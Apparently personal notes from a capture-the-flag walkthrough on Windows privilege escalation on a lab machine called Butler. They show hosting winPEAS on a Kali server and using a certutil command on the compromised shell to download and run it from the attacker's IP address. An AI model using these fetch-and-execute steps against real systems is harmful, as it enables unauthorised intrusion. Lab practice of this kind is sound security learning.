<title>Privilege Escalation</title>
</head><body>As you can see we are Butler in Butler and not Admin so will see how to escalate the Privileges here.<br/>
So when we type Systeminfo we got to know the build (i.e. Windows 10 enterprise) which as very low changes of having exploit<br/>
So will do basic enumeration here and if curious about this do join <b>windows privilege escalation course.<br/>
</b><br/>
There is a tool called Winpeas just like Linpeas <br/>
Will download the winpeasx64 : <a href="https://github.com/carlospolop/PEASS-ng/releases/tag/20221211 ">https://github.com/carlospolop/PEASS-ng/releases/tag/20221211<br/>
</a><br/>
Kali Linux<br/>
After downloading will rename the file and than store it in the transfer folder.<br/>
Command: mv /home/kali/Downloads/winpeas.exe ~/transfer/winpeas.exe<br/>
<br/>
And then will host the server so that we can download the file on the shell and can execute from there.<br/>
python3 -m http.server 80<br/>
<br/>
Remember that we can't use wget to download the file like Linux<br/>
<br/>
Shell :<br/>
cd c:\users<br/>
dir<br/>
cd butler<br/>
dir<br/>
<br/>
Will see the timing of the file at which time the particular file was modified so that will help when we are doing CTFs.<br/>
Will use the certutil command <br/>
certutil.exe -urlcache -f http://192.168.205.128/winpeas.exe winpeas.exe<br/>
dir<br/>
winpeas.exe<br/>
<br/>
